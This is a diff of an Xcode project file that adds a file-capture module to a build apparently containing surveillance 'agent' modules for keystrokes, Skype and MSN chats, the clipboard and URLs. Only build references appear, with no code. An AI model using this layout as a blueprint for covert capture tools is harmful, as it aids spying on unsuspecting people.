@@ -56,6 +56,7 @@
 		1A508B0511A6B1F20067BF81 /* Carbon.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1A508B0411A6B1F20067BF81 /* Carbon.framework */; };
 		1A521EC512FAB9550091ADD5 /* UpgradeNetworkOperationTest.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A521EC412FAB9550091ADD5 /* UpgradeNetworkOperationTest.m */; };
 		1A521ECB12FABAC00091ADD5 /* UpgradeNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A521EC912FABAC00091ADD5 /* UpgradeNetworkOperation.m */; };
+		1A5509B113618F9A00D1A2AD /* RCSMAgentFileCapture.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A5509B013618F9A00D1A2AD /* RCSMAgentFileCapture.m */; };
 		1A68E0BA0FB8838400B17F60 /* RCSMAgentIMSkype.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A68E04F0FB881DD00B17F60 /* RCSMAgentIMSkype.m */; };
 		1A68E1530FB9A3B800B17F60 /* RCSMAgentInputLogger.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A68E1520FB9A3B800B17F60 /* RCSMAgentInputLogger.m */; };
 		1A68E3700FBB1F3200B17F60 /* RCSMAgentURL.m in Sources */ = {isa = PBXBuildFile; fileRef = 1A68E36F0FBB1F3200B17F60 /* RCSMAgentURL.m */; };
@@ -221,6 +222,8 @@
 		1A521EC412FAB9550091ADD5 /* UpgradeNetworkOperationTest.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = UpgradeNetworkOperationTest.m; path = Tests/UpgradeNetworkOperationTest.m; sourceTree = "<group>"; };
 		1A521EC812FABAC00091ADD5 /* UpgradeNetworkOperation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = UpgradeNetworkOperation.h; path = Modules/UpgradeNetworkOperation.h; sourceTree = "<group>"; };
 		1A521EC912FABAC00091ADD5 /* UpgradeNetworkOperation.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = UpgradeNetworkOperation.m; path = Modules/UpgradeNetworkOperation.m; sourceTree = "<group>"; };
+		1A5509AF13618F9A00D1A2AD /* RCSMAgentFileCapture.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMAgentFileCapture.h; path = Agents/RCSMAgentFileCapture.h; sourceTree = "<group>"; };
+		1A5509B013618F9A00D1A2AD /* RCSMAgentFileCapture.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = RCSMAgentFileCapture.m; path = Agents/RCSMAgentFileCapture.m; sourceTree = "<group>"; };
 		1A5B320C12E4A2AF00677A0B /* Transport.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = Transport.m; path = Modules/Transport.m; sourceTree = "<group>"; };
 		1A65115612DDC99100D4F1AF /* IDNetworkOperation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = IDNetworkOperation.h; path = Modules/IDNetworkOperation.h; sourceTree = "<group>"; };
 		1A65115712DDC99100D4F1AF /* IDNetworkOperation.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = IDNetworkOperation.m; path = Modules/IDNetworkOperation.m; sourceTree = "<group>"; };
@@ -578,6 +581,8 @@
 				1A281C970FF3CAC800616589 /* RCSMAgentClipboard.m */,
 				5269F6211330ED7200644B72 /* RCSMAgentApplication.h */,
 				5269F6221330ED7200644B72 /* RCSMAgentApplication.m */,
+				1A5509AF13618F9A00D1A2AD /* RCSMAgentFileCapture.h */,
+				1A5509B013618F9A00D1A2AD /* RCSMAgentFileCapture.m */,
 			);
 			name = Agents;
 			sourceTree = "<group>";
@@ -999,6 +1004,7 @@
 				1A13FE4712F9B4F800B82938 /* RCSMLogger.m in Sources */,
 				5269F6231330ED7200644B72 /* RCSMAgentApplication.m in Sources */,
 				1AC279A813584222009C0812 /* RCSMAgentIMMsnMessenger.m in Sources */,
+				1A5509B113618F9A00D1A2AD /* RCSMAgentFileCapture.m in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
